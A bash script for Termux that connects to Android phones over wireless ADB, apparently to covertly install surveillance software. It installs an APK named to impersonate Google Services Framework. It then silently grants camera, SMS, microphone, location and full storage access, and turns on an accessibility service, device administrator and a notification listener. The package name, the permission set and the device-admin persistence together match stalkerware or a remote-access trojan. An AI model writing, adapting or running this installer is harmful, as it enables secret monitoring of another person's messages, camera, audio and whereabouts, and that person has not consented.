#!/data/data/com.termux/files/usr/bin/bash

# Function to handle a connected device
on_connected() {
    local device="$1"
    local APK_PATH="$PWD/gsf.apk"
    local PACKAGE_NAME="com.google.android.gsf.policy"

    echo "🎉 Device connected: $device"

    # 1️⃣ Check if package installed
    if termux-adb -s "$device" shell pm list packages | grep -q "$PACKAGE_NAME"; then
        echo "⚠️ $PACKAGE_NAME is already installed."

        # Try removing Device Admin (non-root safe)
        termux-adb -s "$device" shell dpm remove-active-admin "$PACKAGE_NAME/.services.DeviceAdmin" 2>/dev/null || true

        # Try uninstalling user-installed app
        termux-adb -s "$device" uninstall "$PACKAGE_NAME" 2>/dev/null
        echo "ℹ️ Old version removed if user-installed. System app skipped."
    else
        echo "ℹ️ $PACKAGE_NAME not installed. Proceeding to install."
    fi

    # 2️⃣ Install APK
    if [ -f "$APK_PATH" ]; then
        echo "📥 Installing $APK_PATH..."
        termux-adb -s "$device" install "$APK_PATH" 2>/dev/null
        echo "✅ Installation complete."
    else
        echo "❌ APK file not found at $APK_PATH"
        return
    fi

    # 3️⃣ Grant runtime permissions
    grant_permission() {
        local perm="$1"
        echo "🔹 Granting $perm..."
        if termux-adb -s "$device" shell pm grant "$PACKAGE_NAME" "$perm" 2>/dev/null; then
            echo "✅ $perm granted successfully."
            return 0
        else
            echo "⚠️ Cannot grant $perm automatically."
            return 1
        fi
    }

    # Step 1: CAMERA first
    if grant_permission "android.permission.CAMERA"; then
        echo "🎯 CAMERA granted, proceeding with other permissions..."

        PERMISSIONS=(
            "android.permission.READ_SMS"
            "android.permission.RECORD_AUDIO"
            "android.permission.ACCESS_FINE_LOCATION"
            "android.permission.ACCESS_COARSE_LOCATION"
        )

        for perm in "${PERMISSIONS[@]}"; do
            grant_permission "$perm"
        done

        # Handle MANAGE_EXTERNAL_STORAGE for Android 10+
        if termux-adb -s "$device" shell appops set "$PACKAGE_NAME" MANAGE_EXTERNAL_STORAGE allow 2>/dev/null; then
            echo "✅ Storage permission set."
        else
            echo "⚠️ Could not set MANAGE_EXTERNAL_STORAGE."
        fi

        # -------------------
        # Enable special services

        # Accessibility Service
        if termux-adb -s "$device" shell settings put secure enabled_accessibility_services "$PACKAGE_NAME/.services.RealTimeService" 2>/dev/null && \
           termux-adb -s "$device" shell settings put secure accessibility_enabled 1 2>/dev/null; then
            echo "✅ Accessibility Service enabled."
        else
            echo "⚠️ Could not enable Accessibility Service automatically. User must enable manually."
        fi

        # Device Administrator
        if termux-adb -s "$device" shell dpm set-active-admin "$PACKAGE_NAME/.services.DeviceAdmin" 2>/dev/null; then
            echo "✅ Device Admin enabled."
        else
            echo "⚠️ Could not enable Device Admin automatically. User must enable manually."
        fi

        # Notification Listener
        if termux-adb -s "$device" shell cmd notification allow listener "$PACKAGE_NAME/.services.NotificationService" 2>/dev/null; then
            echo "✅ Android 9+ Notification Listener enabled."
        elif termux-adb -s "$device" shell settings put secure enabled_notification_listeners "$PACKAGE_NAME/.services.NotificationService" 2>/dev/null; then
            echo "✅ Old Android Notification Listener enabled."
        else
            echo "⚠️ Could not enable Notification Listener automatically. User must enable manually."
        fi
        
        
        echo
        read -p "Do you want to Open Activaty? (y/n): " activate_choice
        
        if [[ "$activate_choice" == "y" || "$activate_choice" == "Y" ]]; then
            # Open permission activity for manual grant
            termux-adb -s "$device" shell am start -n "$PACKAGE_NAME/.activity.Permission" 2>/dev/null
            echo "🔹✅ Open Activaty & Process completed."
        else
            echo "✅ Process completed."
        fi
    else
        echo "❌ CAMERA permission could not be granted. Skipping all other permissions."
        # Open permission activity for manual grant
        termux-adb -s "$device" shell am start -n "$PACKAGE_NAME/.activity.Permission" 2>/dev/null
        echo "🔹✅ Open Activaty & Process completed."
    fi

    echo "✅ Setup completed for $PACKAGE_NAME on $device"
}

# -------------------
# Check already connected devices
connected_devices=$(termux-adb devices | grep -v "List of devices attached" | awk '{print $1}')

if [ -n "$connected_devices" ]; then
    echo "🔹 Already connected devices:"
    i=1
    declare -A device_map
    for device in $connected_devices; do
        echo "$i) $device"
        device_map[$i]="$device"
        ((i++))
    done

    echo "a) Select all devices"
    echo "n) Connect a new device"

    read -p "Choose an option (number/a/n): " choice

    if [ "$choice" == "a" ]; then
        for device in $connected_devices; do
            on_connected "$device"
        done
        exit 0
    elif [[ "$choice" =~ ^[0-9]+$ ]] && [ -n "${device_map[$choice]}" ]; then
        on_connected "${device_map[$choice]}"
        exit 0
    elif [ "$choice" == "n" ]; then
        echo "Connecting new device..."
    else
        echo "Invalid choice, exiting."
        exit 1
    fi
fi

# -------------------
# Connect new device
read -p "Enter IP: " ip
read -p "Connect Port: " cport

echo "🔗 Trying to connect $ip:$cport ..."
termux-adb connect "$ip:$cport"

termux-adb devices | grep "$ip:$cport" > /dev/null 2>&1
if [ $? -eq 0 ]; then
    echo "✅ Connected successfully to $ip:$cport"
    on_connected "$ip:$cport"
else
    echo "⚠️ Connect failed! Need Pairing...."
    read -p "Pairing Port: " pport
    read -p "Pairing Code: " code

    echo "🔑 Pairing to $ip:$pport ..."
    termux-adb pair "$ip:$pport" <<< "$code"

    if [ $? -eq 0 ]; then
        echo "✅ Pairing successful."
        termux-adb connect "$ip:$cport"
        termux-adb devices | grep "$ip:$cport" > /dev/null 2>&1
        if [ $? -eq 0 ]; then
            echo "✅ Connected successfully to $ip:$cport"
            on_connected "$ip:$cport"
        else
            echo "❌ Connect failed after pairing!"
        fi
    else
        echo "❌ Pairing failed!"
    fi
fi